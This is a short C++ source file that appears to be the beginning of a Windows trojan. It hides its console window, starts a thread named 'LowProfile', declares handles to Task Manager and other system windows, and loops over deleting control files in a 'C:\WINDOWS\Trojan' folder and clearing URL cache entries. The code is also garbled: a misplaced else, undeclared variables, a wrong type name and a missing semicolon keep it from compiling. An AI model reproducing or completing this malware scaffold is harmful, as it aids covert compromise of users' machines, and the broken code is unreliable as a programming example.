#include<Windows.h>
#include<shlobj.h>
#include<urlmon.h>
#pragma comment(lib,"winmm.lib")
#include<iostream>
#include<fstream>
#pragma comment(lib,"winInet.lib")

using namespace std;
int option, assign, target;
Dword WINAPI LowProfile(LPVOID);
DWORD WINAPI Option1(LPVOID);
DWORD WINAPI Option2(LPVOID);
DWORD WINAPI Option3(LPVOID);
DWORD WINAPI Option4(LPVOID);
DWORD WINAPI Option5(LPVOID);
DWORD WINAPI Option6(LPVOID);
HWND TaskMgr, SysError, WMP, Disk1, Disk2, Disk3, Autopla;

int main() {
	FreeConsole();
	CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)&LowProfile, 0, 0, NULL);
	FILE *istream;
	if (istream = fopen("C:\\WINDOWS\\Trojan\\assign.txt,", "t")!=NULL) {
	else {
		ifstream instream;
		inAssign.clear();
		inAssign.open("C:\\WINDOWS\\Trojan\\assign.txt");
		inAssign >> Assign;
		inAssign.close();
		inAssign.clear();
	}
	}
	while (1)
	{
		remove("C:\\WINDOWS\\Trojan\\Option.txt");
		remove("C:\\WINDOWS\\Trojan\\target.txt");
		DeleteUrlCacheEntry()
	}
}